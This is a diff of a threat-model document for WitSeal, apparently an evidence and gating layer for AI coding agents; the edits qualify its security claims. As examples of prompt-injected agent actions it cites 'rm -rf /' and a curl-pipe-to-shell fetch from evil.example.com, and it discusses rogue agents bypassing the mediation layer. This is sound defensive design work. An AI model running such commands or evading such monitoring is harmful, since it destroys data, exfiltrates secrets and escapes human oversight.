@@ -11,7 +11,7 @@ The intended audience is security engineers evaluating WitSeal for adoption, and
 
 ## 1. The high-level claim
 
-WitSeal Phase 1 makes AI-coding-agent actions verifiable on a single developer machine. Every action that passes through `witseal exec` produces a hash-chained witness event and a receipt. The chain is replayable. Tampering by a non-producer is detectable.
+WitSeal Phase 1 records the AI-coding-agent actions routed through it on a single developer machine. Every action that passes through `witseal exec` produces a hash-chained witness event and a receipt. The chain is replayable. An edit that is not re-hashed is detectable by anyone; a consistent rewrite is detectable only against a chain head held elsewhere.
 
 Three things WitSeal Phase 1 explicitly does **not** claim:
 
@@ -30,13 +30,13 @@ WitSeal Phase 1 considers four classes of adversary. The protection level differ
 | Adversary | Capabilities | Phase 1 protection |
 |---|---|---|
 | **A1 — Compromised model output** | Sends actions WitSeal mediates | Strong: actions classified, evaluated, optionally denied |
-| **A2 — Non-producer tamperer** | Modifies an exported evidence package or a copy of the chain | Strong: chain re-verification detects modification |
+| **A2 — Non-producer tamperer** | Modifies an exported evidence package or a copy of the chain | Partial: chain re-verification detects a modification that is not re-hashed; a consistent re-hash of the events is detected only against the head recorded at export |
 | **A3 — Malicious producer** | Has full filesystem access on the machine running WitSeal | None in Phase 1; deferred to Phase 5 (Sigstore + Rekor) |
 | **A4 — Subprocess escape** | A subprocess WitSeal spawned escalates beyond captured I/O | Partial: argv recorded, top-level I/O captured, but no syscall mediation; deferred to Phase 5 (kernel-level interposition) |
 
-**A1 (compromised model output)** is the wedge. Phase 1 shines here. A coding agent that has been prompt-injected to run `rm -rf /` is denied by the destructive-block policy pack; the attempt is recorded as evidence; the producer's machine is unharmed.
+**A1 (compromised model output)** is the wedge. Phase 1 shines here. A coding agent that has been prompt-injected to run `rm -rf /` through `witseal exec` in Gate Mode is denied by the destructive-block policy pack; the attempt is recorded as evidence and the command does not run.
 
-**A2 (non-producer tamperer)** is the secondary wedge. The hash chain ensures that an evidence package cannot be modified silently in transit. Verification is local, offline, and requires no third party.
+**A2 (non-producer tamperer)** is the secondary wedge, with a stated limit. The hash chain makes a modification that is not re-hashed fail verification. A tamperer who re-hashes the package's events consistently is caught only if the relying party compares the package's `chain_head_after_range` with the head recorded at export, received over a channel the tamperer does not control. Verification is local, offline, and requires no third party — which is also why, on its own, it cannot catch a consistent re-hash.
 
 **A3 (malicious producer)** is the major Phase 1 limitation. The producer holds all keys, owns the filesystem, and can rewrite the entire chain consistently. Phase 5 introduces Sigstore-based signing through Fulcio (keyless, OIDC-bound) and inclusion in the Rekor transparency log; after that, even the producer cannot rewrite the chain without the rewrite being publicly visible in Rekor.
 
@@ -52,7 +52,7 @@ For each threat, this section states the Phase 1 posture: **mitigated**, **parti
 
 **Description:** A non-producer (intermediary, attacker on the network, malicious copy operation) modifies events or receipts after export.
 
-**Posture:** **Mitigated.** Re-running `verifyChain` over the events detects any modification. The failure points to the exact tampering index.
+**Posture:** **Partially mitigated.** Re-running `verifyChain` over the events detects a modification that was not re-hashed, and the failure points to the exact tampering index. A package whose events were consistently re-hashed, or whose newest events were dropped, passes `verifyChain`; it is detected only by comparing `chain_head_after_range` with the head recorded at export (`witseal evidence export` prints it), obtained over a channel the tamperer does not control.
 
 ### T2. Producer rewriting the chain after the fact
 
@@ -64,7 +64,7 @@ For each threat, this section states the Phase 1 posture: **mitigated**, **parti
 
 **Description:** A prompt-injected or otherwise compromised agent proposes an action like `rm -rf /` or `curl https://evil.example.com/exfil.sh | sh`.
 
-**Posture:** **Mitigated by policy.** With the `block-destructive` and `no-network-egress` policy packs loaded, both are denied. The denials are recorded. With permissive policy, the action passes through but is fully recorded as evidence — a producer-side audit can detect it.
+**Posture:** **Mitigated by policy, for commands routed through `witseal exec` in Gate Mode.** With the `block-destructive` and `no-network-egress` policy packs loaded, `rm -rf /` is denied and the `curl` download requires approval (refused in CI unless allow-listed). The decisions are recorded. With permissive policy, the action passes through and is recorded as evidence (argv, exit code, bounded output) — a producer-side audit can detect it.
 
 ### T4. Prompt injection at the model layer
 
@@ -82,7 +82,7 @@ For each threat, this section states the Phase 1 posture: **mitigated**, **parti
 
 **Description:** A high-risk action proceeds without a recorded approval (someone "yes-spammed" through a prompt).
 
-**Posture:** **Mitigated.** Every approval produces an `ApprovalRecord` sealed into the witness event. The principal type (`human` vs `ci`) is recorded. Auditors can distinguish careless click-through from explicit confirmation by examining timestamps (`prompted_at` to `resolved_at` deltas — a 50ms approval is suspicious).
+**Posture:** **Mitigated.** Every approval produces an `ApprovalRecord` sealed into the witness event. The principal type (`human` vs `ci`) is recorded. Auditors can flag likely careless click-through by examining timestamps (`prompted_at` to `resolved_at` deltas — a 50ms approval is suspicious).
 
 ### T7. Default-allow on timeout
 
@@ -100,13 +100,13 @@ For each threat, this section states the Phase 1 posture: **mitigated**, **parti
 
 **Description:** An attacker fabricates a receipt with a plausible-looking content but incorrect hash linkages.
 
-**Posture:** **Mitigated.** Receipt verification (`verifyReceipt`) checks all internal hash references against the witness event. A fabricated receipt fails one of: `classified_intent_hash`, `policy_decision_hash`, `execution_result_hash`, or `receipt_hash` self-check.
+**Posture:** **Mitigated.** Receipt verification (`verifyReceipt`) checks all internal hash references against the witness event. A fabricated receipt fails one of: `classified_intent_hash`, `policy_decision_hash`, `execution_result_hash`, or `receipt_hash` self-check. A receipt fabricated together with a matching witness event in a consistently re-hashed chain is not detected (see T1, T2).
 
 ### T9. Replay-time policy drift
 
 **Description:** A reviewer replays an old evidence package using current policies. The current policy disagrees with the historical decision; the reviewer is misled.
 
-**Posture:** **Mitigated.** Evidence packages embed the full content of policy packs that were active at chain time. Replay uses those, not current policies. The same-input/same-output property holds.
+**Posture:** **Partially mitigated.** Each witness event records the content hashes of the policy packs active when its decision was made (`active_pack_hashes`), and an evidence package embeds the full content of the packs active at export time. A reviewer can compare the two to detect drift; `witseal replay` and `witseal verify` do not re-evaluate policy.
 
 ### T10. Side-channel inference of policy structure
 
@@ -130,7 +130,7 @@ For each threat, this section states the Phase 1 posture: **mitigated**, **parti
 
 **Description:** Process is killed between the `write` syscall and the `fsync`. Log file is shorter than the in-memory chain head expected.
 
-**Posture:** **Mitigated.** On startup, the runtime reads the log tail and recomputes the chain head. Mismatch between cached head and recomputed head triggers a recovery rebuild. If integrity cannot be verified, the runtime starts in read-only mode and surfaces the error explicitly.
+**Posture:** **Mitigated.** On startup, the runtime reads the log tail and recomputes the chain head. Mismatch between cached head and recomputed head triggers a recovery rebuild. If the hash links do not rebuild, the runtime refuses to append and surfaces the integrity error explicitly.
 
 ### T13. Tampering with WitSeal binary
 
@@ -153,17 +153,17 @@ For each ASI item, what WitSeal Phase 1 addresses:
 | ASI | Description | WitSeal Phase 1 |
 |---|---|---|
 | ASI01 | Agent Goal Hijack | **Out of scope.** Model-layer defense; pair with prompt-injection-aware gateway |
-| ASI02 | Tool Misuse & Exploitation | **Mitigated.** Policy-driven mediation; deny-by-default for high-risk tools |
+| ASI02 | Tool Misuse & Exploitation | **Mitigated for tool calls routed through WitSeal in Gate Mode.** Policy-driven mediation; a high-risk tool call is blocked when an active pack's rule denies it |
 | ASI03 | Identity & Privilege Abuse | **Partially mitigated.** Recording present; identity layer (token minting) deferred to identity gateway integrations |
 | ASI04 | Agentic Supply Chain Vulnerabilities | **Partially mitigated.** SBOM + signed releases; reproducible builds Phase 5 |
-| ASI05 | Unexpected Code Execution | **Mitigated.** Subprocess capture, argv recording, deny-by-default for destructive shells |
+| ASI05 | Unexpected Code Execution | **Mitigated for commands routed through WitSeal in Gate Mode.** Subprocess capture, argv recording, policy denial of destructive commands |
 | ASI06 | Memory & Context Poisoning | **Out of scope.** Model/orchestration-layer concern |
-| ASI07 | Insecure Inter-Agent Communication | **Mitigated for receipt-passing.** Cross-agent trust via shared schemas; full federation Phase 6 |
+| ASI07 | Insecure Inter-Agent Communication | **Not addressed in Phase 1.** Receipts share a schema, but a shared format does not authenticate the sender: a v0.1 receipt is unsigned and a v0.2 signature is the producer's own. Federation Phase 6 |
 | ASI08 | Cascading Failures | **Out of scope in Phase 1.** Phase 4+ may add circuit-breaker semantics |
 | ASI09 | Human-Agent Trust Exploitation | **Partially mitigated.** Approval records prevent silent overrides; UX for approval is conservative |
-| ASI10 | Rogue Agents | **Mitigated for governed agents.** A rogue agent cannot bypass WitSeal because the runtime mediates execution — but a rogue agent that doesn't go through WitSeal at all is uncovered (this is the integration responsibility of the user) |
+| ASI10 | Rogue Agents | **Mitigated for actions routed through WitSeal in Gate Mode.** Those actions are mediated — but WitSeal does not establish that an agent has no other action path, and a rogue agent that doesn't go through WitSeal at all is uncovered (this is the integration responsibility of the user) |
 
-The honest claim: **WitSeal Phase 1 directly addresses ASI02, ASI03, ASI05, ASI07, ASI09, and ASI10.** It does **not** address ASI01, ASI06, or ASI08, and only partially addresses ASI04. Documenting that explicitly is itself a security posture.
+The honest claim: **WitSeal Phase 1 directly addresses ASI02, ASI03, ASI05, ASI09, and ASI10 for actions routed through it.** It does **not** address ASI01, ASI06, ASI07, or ASI08, and only partially addresses ASI04. Documenting that explicitly is itself a security posture.
 
 ---
 
